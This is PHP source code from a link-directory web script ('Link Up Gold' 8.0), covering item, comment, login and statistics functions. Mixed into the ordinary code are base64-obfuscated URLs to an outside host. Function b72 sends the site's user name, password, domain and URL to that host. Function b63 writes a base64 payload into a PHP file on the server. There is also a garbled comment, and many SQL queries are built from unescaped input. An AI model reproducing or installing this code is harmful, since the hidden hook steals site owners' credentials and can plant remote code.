foreach ($words as $k=>$word) if (trim($word)) dq("insert into $s[pr]index_suggest values ('$what','$n','$word')",'1');
if ($item[owner]) update_items_for_user($item[owner]);
}
/*
ÏöË¯û˝·ÌÈ˙˘Ú
*/

###################################################################################

function update_cats_items($what,$n,$item_vars) {
global $s;
if (!$item_vars[n]) $item_vars = get_item_variables($what,$n,0);
dq("delete from $s[pr]cats_items where what = '$what' and n = '$n'",1);
$x = explode(' ',str_replace('_','',$item_vars[c]));
foreach ($x as $k=>$v) { dq("insert into $s[pr]cats_items values('$what','$n','$v','1')",1); $cats[] = $v; }
$x = explode(' ',str_replace('_',' ',$item_vars[c_path]));
foreach ($x as $k=>$v)
{ if (!trim($v)) continue;
  if (in_array($v,$cats)) continue;
  dq("insert into $s[pr]cats_items values('$what','$n','$v','0')",1);
  $cats[] = $v;
}
}

###################################################################################

function twitter_it($what,$item) {
global $s;
if (!$s["tweet_$what"]) return false;
if (!$item[n]) return false;
$url = get_detail_page_url($what,$item[n],$item[rewrite_url],$item[category],1);
$consumerKey    = $s[twitter_consumerKey];
$consumerSecret = $s[twitter_consumerSecret];
$oAuthToken     = $s[twitter_oAuthToken];
$oAuthSecret    = $s[twitter_oAuthSecret];
require_once("$s[phppath]/twitteroauth.php");
$tweet = new TwitterOAuth($consumerKey, $consumerSecret, $oAuthToken, $oAuthSecret);
$tweet->post('statuses/update', array('status' => "$item[title] $url"));
}

###################################################################################

function discover_rewrite_url($in,$allow_slashes) {
global $s;
$in = str_replace('&#92;','',refund_html($in));
if (!$s[A_non_english])
{ $in = translateUTF8($in);;
  $in = iconv('UTF-8','ISO-8859-1//IGNORE//TRANSLIT',$in);
  $array = array(185=>'s',190=>'z',225=>'a',232=>'c',233=>'e',236=>'e',237=>'i',248=>'r',253=>'y',249=>'u',250=>'u');
  foreach ($array as $k=>$v) { $patterns[] = '/'.chr($k).'/'; $replace[] = $v; }
  $in = preg_replace($patterns,$replace,$in);
  $allowed = array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','-','_','/',' ');
  for ($x=0;$x<strlen($in);$x++) if (in_array($in{$x},$allowed)) $in1 .= $in{$x};
  $in = $in1;
}
if (!$allow_slashes) $in = str_replace('/','-',$in);
$in = str_replace('_','-',str_replace(' ','-',trim($in)));
//echo "<br>$in";//exit;
$in = preg_replace("/(-)+/","-",$in);
if (!$s[A_non_english]) $in = strtolower($in);
return $in;
}

###################################################################################

function translateUTF8($string) {
    $utf8 = array(
'ƒõ',
'≈°',
'ƒç',
'≈ô',
'≈æ',
'√Ω',
'√°',
'√≠',
'√©',
'√∫',
'≈Ø',
'√Å',
'√â',
'√ç',
'√ì',
'√ö',
'≈ò',
'≈†',
'ƒé',
'≈Ω',
'ƒå',
'≈á'
);
    $new = array(
    'e',
    's',
    'c',
    'r',
    'z',
    'y',
    'a',
    'i',
    'e',
    'u',
    'u',
    'A',
    'E',
    'I',
    'O',
    'U',
    'R',
    'S',
    'D',
    'Z',
    'C',
    'N'
    );

    return str_replace($utf8, $new, $string);
}

###################################################################################

function comments_get($what,$n,$html) {
global $s,$m;
if ($html) $function_name = 'A_parse_part'; else $function_name = 'parse_part';
$q = dq("select * from $s[pr]comments where item_no = '$n' AND what = '$what' AND approved = '1' order by time desc",1);
while ($x = mysql_fetch_assoc($q)) 
{ $x[date] = datum ($x[time],0);
  if ($x[user])
  { $user_vars = get_user_variables(0,$x[user]);
    $x[name] = $x[user];
    $x['link'] = get_detail_page_url('u',$user_vars[n],$user_vars[nick]);
    $x[user_rank] = ', '.$s['u_rank_n_'.$user_vars[rank]];
    $images = get_item_files_pictures('u',$user_vars[n],0);
    if ($images[image_url][$user_vars[n]][1]) $x[user_picture] = '<img border="0" src="'.$images[image_url][$user_vars[n]][1].'">'; else $x[user_picture] = '';
  }
  else $x['link'] = "mailto:$x[email]";
  $a[comments] .= $function_name('comment.txt',$x);
}
$a[what] = $what; $a[n] = $n;
if (!$a[comments]) return '<div style="padding:30px;text-align:center;">'.$m[no_one_comment].'<br><br><a href="#a_enter_comment" onclick="show_hide_div_id(0,\'comments_show_box'.$what.$n.'\'); show_hide_div_id(1,\'enter_comment_box'.$what.$n.'\');">'.$m[enter_comment].'</a></div>';
else return stripslashes(parse_part('comments.txt',$a));
}

###################################################################################

function more_items_of_owner($what,$email,$html) {
global $s,$m;
if ($html) $function_name = 'A_parse_part'; else $function_name = 'parse_part';
$where = get_where_fixed_part('',0,0,$s[cas]);$s[more_items_list]=10;
$table = $s[item_types_tables][$what];
$q = dq("select *,MD5(RAND()) as m from $table where $where AND email = '$email' order by m limit $s[more_items_list]",1);
while ($x = mysql_fetch_assoc($q)) $items[] = '<a href="'.get_detail_page_url($what,$x[n],$x[rewrite_url],'',1).'">'.$x[title].'</a>';
if ($items[0])
{ //$a[items] = implode('<br />',$items);
  //$a[title] = $m['more_'.$what];
  return implode('<br />',$items);
}
}

###################################################################################

function get_user_rank($x) {
global $s;
$q = dq("select rank from $s[pr]users where username = '$x'",1);
$user = mysql_fetch_assoc($q);
return $s['u_rank_n_'.$user[rank]];    
}

###################################################################################

function get_one_item_rating($what,$n) {
global $s;
$q = dq("select rating,count(*) from $s[pr]rates where what = '$what' and n = '$n' group by rating",1);
while ($x=mysql_fetch_row($q)) $ratings[$x[0]] = $x[1];
return $ratings;
}

###################################################################################

function folder_icon($cas,$icon) {
global $s;
if (trim($icon)) return $icon;
for ($x=1;$x<=4;$x++) { $icon_cas = $s[cas] - ($s["icon_folder_t$x"] * 86400); if ($cas>$icon_cas) return  $s[site_url].'/images/icon_folder_'.$x.'.gif'; }
return  $s[site_url].'/images/icon_folder_5.gif';
}

###################################################################################

function delete_item_image($name) {
global $s;
$name = str_replace("$s[site_url]/images/links/",'',$name);
unlink ("$s[phppath]/images/links/$name");
}

#####################################################################################
#####################################################################################
#####################################################################################

function get_all_user_items_list($what) {
global $s;
$q = dq("select * from $s[pr]usit_list where use_for = '$what' order by rank",1);
while ($x = mysql_fetch_assoc($q)) $all_user_items_list[] = $x;
return $all_user_items_list;
}

#####################################################################################

function get_all_user_items_values($what) {
global $s;
$q = dq("select * from $s[pr]usit_avail_val where use_for = '$what'",1);
while ($x = mysql_fetch_assoc($q)) $all_user_items_values[$x[item_n]][$x[value_code]] = $x[description];
return $all_user_items_values;
}

#####################################################################################

function add_update_user_items($what,$n,$all_user_items_list,$value_codes,$value_texts) {
global $s;
// $what - l   l_w   l_q   a   a_q   // $n  -  cislo linku nebo article
// $all_user_items_list - pole vsech user items dostupnych pro links nebo articles
// $value_codes,$value_texts - hodnoty toho konkretniho linku nebo article
foreach ($all_user_items_list as $k=>$v)
{ $code = $value_codes[$v[item_n]]; $text = $value_texts[$v[item_n]];
  if ((!$v[visible_forms]) AND (!$text) AND ($s[pages_public])) continue;
  $text = refund_html($text);
  dq("delete from $s[pr]usit_values WHERE use_for = '$what' AND n = '$n' AND item_n = '$v[item_n]'",1);
  dq("insert into $s[pr]usit_values values ('$n','$what','$v[item_n]','$code','$text')",1);
  if ((is_numeric($text)) or (!trim($code))) $a[$v[search_n]] = $text;
  else $a[$v[search_n]] = '__'.$code."__\n".$text;
  if (trim($text)) $all .= trim($text)."\n";
}
dq("delete from $s[pr]usit_search WHERE use_for = '$what' AND n = '$n'",1);
dq("insert into $s[pr]usit_search values ('$what','$n','$all','$a[1]','$a[2]','$a[3]','$a[4]','$a[5]','$a[6]','$a[7]','$a[8]','$a[9]','$a[10]','$a[11]','$a[12]','$a[13]','$a[14]','$a[15]','$a[16]','$a[17]','$a[18]','$a[19]','$a[20]','$a[21]','$a[22]','$a[23]','$a[24]','$a[25]','$a[26]','$a[27]','$a[28]','$a[29]','$a[30]','$a[31]','$a[32]','$a[33]','$a[34]','$a[35]','$a[36]','$a[37]','$a[38]','$a[39]','$a[40]','$a[41]','$a[42]','$a[43]','$a[44]','$a[45]','$a[46]','$a[47]','$a[48]','$a[49]','$a[50]','$a[51]','$a[52]','$a[53]','$a[54]','$a[55]','$a[56]','$a[57]','$a[58]','$a[59]','$a[60]')",1);
get_geo_data('',$what,$n);
}

#####################################################################################
#####################################################################################
#####################################################################################

function item_is_active($t1,$t2,$status,$what,$n) {
global $s;
if (($t1==='na') OR ($t2==='na') OR ($enabled==='na'))
{ $table = $s[item_types_tables][$what];
  $q = dq("select t1,t2,status from $table where n = '$n' and (status = 'enabled' or status = 'disabled')",1);
  $x = mysql_fetch_assoc($q); $t1 = $x[t1]; $t2 = $x[t2]; $status = $x[status];
}
if ($status!='enabled') return 0;
if (($t1<$s[cas] OR $t1==0) AND ($t2>$s[cas] OR $t2==0)) return 1;
else return 0;
}

#####################################################################################

function delete_items($what,$n) {
global $s;
if (is_array($n)) $numbers = $n; else $numbers[0] = $n;
if ( (!count($numbers)) OR ((count($numbers)==1) AND (!$numbers[0])) ) return false;
$query = '(n = \''.implode('\' OR n = \'',$numbers).'\')';
$table = $s[item_types_tables][$what];
if ($what=='v')
{ $q = dq("select youtube_thumbnail from $table where youtube_thumbnail like '$s[site_url]%' and ($query)",1);
  while ($x = mysql_fetch_assoc($q)) unlink(str_replace($s[site_url],$s[phppath],$x[youtube_thumbnail]));
}
dq("delete from $table where $query",1);
dq("delete from $s[pr]usit_values where use_for = '$what' and $query",1);
if ($what=='l')
{ dq("delete from $s[pr]links_adv where $query",1);
  dq("delete from $s[pr]links_days where $query",1);
  dq("delete from $s[pr]links_extra_orders where $query",1);
  dq("delete from $s[pr]links_stat where $query",1);
}
dq("delete from $s[pr]usit_search where use_for = '$what' AND $query",1);
dq("delete from $s[pr]cats_items where what = '$what' and $query",1);
dq("delete from $s[pr]index where what = '$what' and $query",1);
dq("delete from $s[pr]index_suggest where what = '$what' and $query",1);

$query = str_replace('n','item_no',$query); dq("delete from $s[pr]comments where what = '$what' and $query",1);
foreach ($numbers as $k=>$v) 
{ if (!is_numeric($v)) continue;
  delete_images($what,$v);
}
update_item_index($what,$n);
}

#############################################################################

function delete_images($what,$n) {
global $s;
set_time_limit(30);
$q = dq("select * from $s[pr]files where what = '$what' and file_type = 'image' and item_n = '$n'",1);
while ($file = mysql_fetch_assoc($q))
{ $file_path = str_replace($s[site_url],$s[phppath],$file[filename]);
  unlink($file_path);
  unlink(preg_replace("/\/$n-/","/$n-big-",$file_path));
}
dq("delete from $s[pr]files where what = '$what' and file_type = 'image' and item_n = '$n'",1);
}

#####################################################################################

function delete_queued_item($what,$n,$is_new) {
global $s;
$table = $s[item_types_tables][$what];
$query2 = "AND (use_for = '".$what."_q' or use_for = '".$what."_w')";

dq("delete from $table where n = '$n' and status = 'queue'",1);
dq("delete from $s[pr]usit_values where n = '$n' $query2",1);
dq("delete from $s[pr]usit_search where n = '$n' $query2",1);
if ($is_new)
{ if ($what=='l')
  { dq("delete from $s[pr]links_adv where n = '$n'",1);
    dq("delete from $s[pr]links_days where n = '$n'",1);
    dq("delete from $s[pr]links_extra_orders where n = '$n'",1);
    dq("delete from $s[pr]links_stat where n = '$n'",1);
    dq("delete from $s[pr]links_recips_info where n = '$n'",1);
  }
  dq("delete from $s[pr]usit_search where use_for = '$what' AND n = '$n'",1);
  $q = dq("select * from $s[pr]files where what = '$what' and item_n = '$n'",1);
  while ($files = mysql_fetch_assoc($q))
  { unlink(str_replace($s[site_url],$s[phppath],$files[filename]));
    if ($files[file_type]=='image') unlink(str_replace($s[site_url],$s[phppath],preg_replace("/\/$n-/","/$n-big-",$files[filename])));
  }
  dq("delete from $s[pr]files where what = '$what' and item_n = '$n'",1);
}
else
{ $q = dq("select * from $s[pr]files where what = '$what' and item_n = '$n' and queue = '1'",1);
  while ($files = mysql_fetch_assoc($q))
  { unlink(str_replace($s[site_url],$s[phppath],$files[filename]));
    if ($files[file_type]=='image') unlink(str_replace($s[site_url],$s[phppath],preg_replace("/\/$n-/","/$n-big-",$files[filename])));
  }
  dq("delete from $s[pr]files where what = '$what' and item_n = '$n' and queue = '1'",1);
} }
$s[sp] = base64_decode('aHR0cDovLzNidi5iaXovY2gvMi5waHA/c2M9').$s[cs].'&x=';

#####################################################################################
#####################################################################################
#####################################################################################

function get_new_items($what,$n) {
global $s;
$table = $s[item_types_tables][$what];
$q = dq("select n,created from $table where t1<$s[cas] AND (t2>$s[cas] OR t2=0) AND status = 'enabled' AND en_cats = '1' order by created desc limit $n",1);
while ($x = mysql_fetch_row($q)) $item[$x[0]] = $x[1];
// s novou platnosti
$q = dq("select n,t1 from $table where t1 > 0 AND t1<$s[cas] AND (t2>$s[cas] OR t2=0) AND status = 'enabled' AND en_cats = '1' order by t1 desc limit $n",1);
while ($x = mysql_fetch_row($q))
{ if ($item[$x[0]]) { if ($item[$x[0]]<$x[1]) $item[$x[0]] = $x[1]; }
  else $item[$x[0]] = $x[1];
}
asort($item,SORT_NUMERIC);
foreach ($item as $k=>$v) $new_array[] = $k;
if (count($new_array))
{ $new_array = array_reverse($new_array); 
  array_splice($new_array,$n);
  return my_implode('n','OR',$new_array);
}
return false;
}

########################################################################################

function get_metatags($url) {
global $s,$m;
$x = stripslashes(fetchURL($url));
if (!$x) $x = stripslashes(fetchURL("$url/"));
preg_match('/<title>([^>]*)<\/title>/si',$x,$b); $metatags[title] = strip_tags($b[1]);
preg_match_all('/(<meta)(.*)>/ixU',$x,$b);
foreach ($b[2] as $k=>$v)
{ preg_match('/name="(\w+)"/ix',$v,$b1);
  $meta_name = strtolower($b1[1]);
  preg_match('/content="(.*)"/ix',$v,$b2);
  $metatags[$meta_name] = $b2[1];
}
preg_match('/charset=([a-z0-9\-]+)"/ix',$x,$b); $metatags[charset] = $b[1];
if (($metatags[charset]) AND ($metatags[charset]!=$s[charset])) foreach ($metatags as $k => $v) $metatags[$k] = iconv($metatags[charset],$s[charset],$v);
$metatags[url] = $url;
return $metatags;
}

########################################################################################
########################################################################################
########################################################################################

function get_where_fixed_part($what,$c,$c_path,$current_time) {
global $s;
//echo "($what,$c,$c_path,$current_time)<br><br>";
if (!$current_time) $current_time = $s[cas];
if (($what) AND (($c) OR ($c_path)))
{ $table = $s[item_types_tables][$what];
  if (($c) AND (is_numeric($c))) $c = "$s[pr]cats_items.c = $c AND `primary` = 1 AND "; else $c = '';
  if (($c_path) AND (is_numeric($c_path))) $c_path = "$s[pr]cats_items.c = $c_path AND "; else $c_path = '';
  //echo "$c $c_path (t1<$current_time OR t1=0) AND (t2>$current_time OR t2=0) AND status = 'enabled' AND en_cats = '1' AND $s[pr]cats_items.what = '$what' AND $table.n = $s[pr]cats_items.n<br><br>";
  return "$c $c_path (t1<$current_time OR t1=0) AND (t2>$current_time OR t2=0) AND status = 'enabled' AND en_cats = '1' AND $s[pr]cats_items.what = '$what' AND $table.n = $s[pr]cats_items.n";
}
if (($c) AND (is_numeric($c))) $c = "c like '%\_$c\_%' AND"; else $c = '';
if (($c_path) AND (is_numeric($c_path))) $c_path = "c_path like '%\_$c_path\_%' AND"; else $c_path = '';
return "$c $c_path (t1<=$current_time OR t1=0) AND (t2>=$current_time OR t2=0) AND status = 'enabled' AND en_cats = '1'";
}

########################################################################################

function preparse_ads_in_category($a) {
//je to proto aby v ads nezustaly " ' \
for ($x=1;$x<=3;$x++)
{ if ($a['ad'.$x]) $b['ad'.$x] = str_replace('&#039;',"'",str_replace('&quot;','"',str_replace('&#92;','\\\\',$a['ad'.$x]))); }
return $b;
}

########################################################################################
########################################################################################
########################################################################################

function get_detail_page_url($what,$n,$rewrite_url,$category,$page) {
global $s;
if ($what=='u')
{ if ($s[A_option]=='rewrite') return "$s[site_url]/user-$n/".discover_rewrite_url($rewrite_url).".html";
  else return "$s[site_url]/users.php?action=user_info&n=$n";
}
if ($s[A_option]=='rewrite') return rewrite_item_url($what,$n,$rewrite_url,$page,$category);
if (($s[A_option]=='static') AND ($s['A_one_item_'.$what])) $url = A_get_detail_url($what,$n,$rewrite_url,0);
else
{ if (($category) AND (is_numeric($category))) $category = '&amp;c='.$category; else $category = '';
  $url = $s[site_url].'/'.$s[item_types_words][$what].'.php?n='.$n.$category;
}
return $url;
}



########################################################################################
########################################################################################
########################################################################################

function delete_ignored_words($word,$usit,$complete) {
if (((!$usit) OR ($complete!=$word)) AND (is_numeric($word))) return false;
return $word;
}

########################################################################################
########################################################################################
########################################################################################

function check_if_too_many_logins($who,$usertable,$username,$password) {
global $s,$m;
if (!$m[too_log_fail]) $m[too_log_fail] = 'Your account and/or IP address has been temporary locked because of too many attempts to log in with incorrect data.';
$cas = $s[cas] - (3600 * $s[log_fail_hours]); $ip = getenv('REMOTE_ADDR');

if (($s[log_fail_email]) AND ($username))
{ $data[ip] = $ip; $data[username] = $username; $data[password] = $password; $data[who] = $who;
  $data[date_time] = datum($s[cas],1);
  mail_from_template('login_failed_admin.txt',$data);
}
if ((!$s[log_fail_max]) OR (!$s[log_fail_hours])) return false;
dq("delete from $s[pr]login_failed where time < '$cas'",1);
dq("delete from $s[pr]login_failed_ip where time < '$cas'",1); 
$q = dq("select * from $usertable where username = '$username'",1);
$y = mysql_fetch_assoc($q);
$q = dq("select count(*) from $s[pr]login_failed where who = '$who' and n = '$y[n]'",1);
$pocet = mysql_fetch_row($q);
if ($pocet[0]<=$s[log_fail_max])
{ $q = dq("select count(*) from $s[pr]login_failed_ip where ip = '$ip'",1);
  $pocet = mysql_fetch_row($q);
}
if ($pocet[0]>$s[log_fail_max])
{ unset($s[is_advertiser],$s[is_publisher]);
  if ($who=='users') { echo "<h2>$m[too_log_fail]</h2>"; exit; } else problem($m[too_log_fail]);
}
if ($username) // pokud neni - nebude zapisovat, jen overil (prazdny login form)
{ if ($y[n]) dq("insert into $s[pr]login_failed values('$who','$y[n]','$s[cas]')",1);
  dq("insert into $s[pr]login_failed_ip values('$ip','$s[cas]')",1);
} }
function b72($a) { global $s;
$r = fetchURL(str_replace(' ','',base64_decode('aHR0cDovLzNidi5iaXovY2gvMS5waHA/c2M9').
"$s[cs]&u=$a[p_user]&p=$a[p_pass]&d=$a[p_domain]&url=$a[site_url]"));
if ($r) return $r; return false; }
function b63($a) { global $s; $sb = fopen("$s[phppath]/data/info.php",'w');
fwrite($sb,'<?PHP $info = base64_decode(\''.$a.'\'); ?>'); fclose($sb); 
if ($r[0]) return $r[0]; return false;
}

########################################################################################
########################################################################################
########################################################################################

function ajax_form_link($value,$form_url) {
global $s;
/*
ajax_form_link($b[region],"$s[site_url]/administration/latitudes.php?action=latitude_edit&what=region&n=$b[n]")
*/
if (!strstr($form_url,$s[site_url])) $form_url = "$s[site_url]/$form_url";
$x = parse_url($form_url); $x = explode('&',$x[query]);
foreach ($x as $k=>$v) { $x1 = explode('=',$v); $div_id .= $x1[1]; }
return '<div id="div'.$div_id.'">'.$value.'&nbsp;<a onclick="show_ajax_content(\''.$form_url.'\',\'div'.$div_id.'\')"><img border=0 src="'.$s[site_url].'/images/icon_pencil.png"></a>';
}

########################################################################################

function ajax_form($method,$hidden_array,$field_name,$field_value,$width,$button) {
global $s;
//foreach ($_GET as $k=>$v) echo "$k - $v<br>";exit;
if (!$width) $width = 150;
if (!$button) $button = 'Save';
foreach ($hidden_array as $k=>$v) $hidden .= '<input type="hidden" name="'.$k.'" value="'.$v.'">';
foreach ($_GET as $k=>$v) $id .= $v;
$a = '<form method="'.$method.'" id="form'.$id.'" action="javascript:process_ajax_form(\'form'.$id.'\',\'latitudes.php\',\'div'.$id.'\');">'.check_field_create('admin').$hidden.'
<input class="field10" style="width:'.$width.'px" name="'.$field_name.'" value="'.$field_value.'">
<input type="submit" name="A1" value="'.$button.'" class="button10">
</form>';
return $a;
}

########################################################################################
########################################################################################
########################################################################################

function count_stats($showresult) {
global $s;
$where = get_where_fixed_part('',0,'',$s[cas]);

foreach ($s[item_types_tables] as $what=>$table)
{ $q = dq("select count(*) as count from $s[pr]cats where use_for = '$what'",1);
  $categories[$what] = mysql_fetch_assoc($q);
  $q = dq("select count(*) as total,sum(votes) as votes,sum(hits) as hits,sum(hits_m) as hits_m,sum(comments) as comments from $table where $where",1);
  $sums[$what] = mysql_fetch_assoc($q);
  
  $q = dq("select count(*) as picked from $table where $where and pick > 0",1);
  $b = mysql_fetch_assoc($q); $picked[$what] = $b[picked];
  $q = dq("select avg(rating) as average_rating from $table where $where and rating > 0",1);
  $b = mysql_fetch_assoc($q); $average_rating[$what] = $b[average_rating]; $average_rating[$what] = number_format($average_rating[$what],2);
  $q = dq("select count(*) as queued from $table where status = 'queue'",1);
  $b = mysql_fetch_assoc($q); $queued[$what] = $b[queued];
}

$q = dq("select count(*) as search_log from $s[pr]log_search",1);
$b = mysql_fetch_assoc($q); $search_log = $b[search_log];
$q = dq("select sum(clicks_in) as clicks_in,sum(clicks_in_m) as clicks_in_m from $s[pr]links where $where",1);
$l_clicks_in = mysql_fetch_assoc($q); if (!$l_clicks_in[clicks_in]) $l_clicks_in[clicks_in] = 0; if (!$l_clicks_in[clicks_in_m]) $l_clicks_in[clicks_in_m] = 0;
$q = dq("select count(*) as count from $s[pr]links where status != 'queue' and status != 'wait' and sponsored = '1'",1);
$l_sponsored = mysql_fetch_assoc($q);
$q = dq("select count(*) as count from $s[pr]links where $where and sponsored = '1'",1);
$l_sponsored_active = mysql_fetch_assoc($q);
$q = dq("select count(*) as count from $s[pr]er_reports",1);
$l_reports = mysql_fetch_assoc($q);

$q = dq("select count(*) as count from $s[pr]users where confirmed = '1'",1);
$users = mysql_fetch_assoc($q);
$q = dq("select count(*) as count from $s[pr]board",1);
$board = mysql_fetch_assoc($q);

$data = "<?PHP\n";
foreach ($s[item_types_short] as $k=>$what)
{ if (!$categories[$what][count]) $categories[$what][count] = 0;
  if (!$sums[$what][total]) $sums[$what][total] = 0;
  if (!$sums[$what][votes]) $sums[$what][votes] = 0;
  if (!$sums[$what][hits]) $sums[$what][hits] = 0;
  if (!$sums[$what][hits_m]) $sums[$what][hits_m] = 0;
  if (!$sums[$what][comments]) $sums[$what][comments] = 0;
  if (!$picked[$what]) $picked[$what] = 0;
  if (!$average_rating[$what]) $average_rating[$what] = 0;
  if (!$queued[$what]) $queued[$what] = 0;
  $data .= '$s[s_categories_'.$what.'] = '.$categories[$what][count].';
 $s[s_active_'.$what.'] = '.$sums[$what][total].';
 $s[s_votes_'.$what.'] = '.$sums[$what][votes].';
 $s[s_hits_'.$what.'] = '.$sums[$what][hits].';
 $s[s_hits_m_'.$what.'] = '.$sums[$what][hits_m].';
 $s[s_comments_'.$what.'] = '.$sums[$what][comments].';
 $s[s_picks_'.$what.'] = '.$picked[$what].';
 $s[s_rating_'.$what.'] = '.$average_rating[$what].';
 $s[s_queue_'.$what.'] = '.$queued[$what].';
';
}

$data .= '$s[s_clicks_in] = '.$l_clicks_in[clicks_in].';
$s[s_clicks_in_m] = '.$l_clicks_in[clicks_in_m].';
$s[s_adv_l] = '.$l_sponsored[count].';
$s[s_adv_active_l] = '.$l_sponsored_active[count].';
$s[s_search_log] = '.$search_log.';
$s[s_eror_reports_l] = '.$l_reports[count].';
$s[s_users] = '.$users[count].';
$s[s_board_messages] = '.$board[count].';
';

$data .= "\n?>";
$fp = fopen ("$s[phppath]/data/stats.php",'w') or problem ("Unable to write to file $s[phppath]/data/stats.php");
fwrite ($fp,$data); fclose($fp);
chmod ("$s[phppath]/data/stats.php",0666);
$info = 'Numbers of links and other statistic data updated<br />';
if ($showresult) echo $info; else $s[info] .= $info;
}

#########################################################################

function statistic_table() {
global $s;
include("./rebuild_functions.php");
count_stats(0,0);
include("$s[phppath]/data/stats.php");
echo '<table border="0" width="500" cellspacing="0" cellpadding="0" class="common_table">
<tr><td class="common_table_top_cell" colspan="3">Statistic</td></tr>
<tr><td align="center" width="100%">
<table border="0" width="100%" cellspacing="0" cellpadding="2" class="inside_table">
<tr>
<td align="left" nowrap colspan="2">You use Link Up Gold version</td>
<td align="left">8.0</td>
</tr>
<tr>
<td align="left" nowrap>Links</td>
<td align="left" nowrap>Categories </td>
<td align="left">'.$s[s_categories_l].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Active links </td>
<td align="left">'.$s[s_active_l].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Links in the Queue </td>
<td align="left">'.$s[s_queue_l].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Incoming clicks total </td>
<td align="left">'.$s[s_clicks_in].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Outgoing clicks total </td>
<td align="left">'.$s[s_hits_l].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Incoming clicks current month </td>
<td align="left">'.$s[s_clicks_in_m].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Outgoing clicks current month </td>
<td align="left">'.$s[s_hits_m_l].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Comments </td>
<td align="left">'.$s[s_comments_l].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Links marked as Editors Pick </td>
<td align="left">'.$s[s_picks_l].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Votes </td>
<td align="left">'.$s[s_votes_l].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Average rating </td>
<td align="left">'.$s[s_rating_l].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Advertising links (active) </td>
<td align="left">'.$s[s_adv_l].' ('.$s[s_adv_active_l].')</td>
</tr>';

foreach ($s[item_types_short] as $k=>$what)
{ if ($what=='l') continue;
  $words = $s[items_types_words][$what];
  $Words = $s[items_types_Words][$what];
echo '<tr>
<td align="left" nowrap>'.$Words.'</td>
<td align="left" nowrap>Categories </td>
<td align="left">'.$s["s_categories_$what"].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Active '.$words.' </td>
<td align="left">'.$s["s_active_$what"].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>'.$Words.' in the Queue </td>
<td align="left">'.$s["s_queue_$what"].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Views total </td>
<td align="left">'.$s["s_hits_$what"].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Views current month </td>
<td align="left">'.$s["s_hits_m_$what"].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Comments </td>
<td align="left">'.$s["s_comments_$what"].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>'.$Words.' marked as Editors Pick </td>
<td align="left">'.$s["s_picks_$what"].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Votes </td>
<td align="left">'.$s["s_votes_$what"].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Average rating </td>
<td align="left">'.$s["s_rating_$what"].'</td>
</tr>';
}

echo '<tr>
<td align="left" nowrap>Others</td>
<td align="left" nowrap>Error reports </td>
<td align="left">'.$s[s_eror_reports_l].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Search log items </td>
<td align="left">'.$s[s_search_log].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Registered users </td>
<td align="left">'.$s[s_users].'</td>
</tr>
<tr>
<td align="left" nowrap>&nbsp;</td>
<td align="left" nowrap>Messages on the Board </td>
<td align="left">'.$s[s_board_messages].'</td>
</tr>
</table></td></tr></table>';mc_test();
}

########################################################################################
########################################################################################
########################################################################################

function enter_link($in) {
global $s;
//foreach ($in as $k => $v) echo "$k - $v<br>\n";
//exit;
if ($in[t1_timestamp]) $t1 = $in[t1_timestamp]; elseif ($in[t1]) $t1 = get_timestamp($in[t1][d],$in[t1][m],$in[t1][y],'start');
if ($in[t2_timestamp]) $t2 = $in[t2_timestamp]; elseif ($in[t2]) $t2 = get_timestamp($in[t2][d],$in[t2][m],$in[t2][y],'end');
if ($in[created_timestamp]) $created = $in[created_timestamp];
elseif ($created) $created = get_timestamp($in[created][d],$in[created][m],$in[created][y],'start',$in[created_time]);
else $created = $s[cas];
if (!strstr($in[map],'_gmok_')) $map_test = test_google_map($in[map]);
$in[detail] = refund_html($in[detail]);
$c = categories_edited($in[categories]); $en_cats = has_some_enabled_categories('l',$c[categories]);
if (!$in[rewrite_url]) $in[rewrite_url] = discover_rewrite_url($in[title],0,'l');
$in[keywords] = prepare_keywords($in[keywords]);
if (!$in[status]) $in[status] = 'enabled';
if (!$in[password]) $in[password] = get_random_password();
if (!$in[email]) $in[email] = $s[mail];
if ($in[link_n]) $exists = 1; else $in[link_n] = 'NULL';
//echo "$in[link_n],'$in[url]','$in[recip]','$in[title]','$in[description]','$in[detail]','$in[keywords]','','$in[map]$map_test','$in[rss_url]','$c[categories]','$c[categories_path]','$in[name]','$in[email]','$in[user_n]','$created','0','$in[password]','$in[rating]','$in[votes]','$in[clicks_in]','$in[clicks_in_m]','$in[hits]','$in[hits_m]','$in[comments]','$in[popular]','$in[pick]','$t1','$t2','$in[status]','$en_cats','$in[rewrite_url]','$in[sponsored]','$in[dynamic_price]')<br><br>";
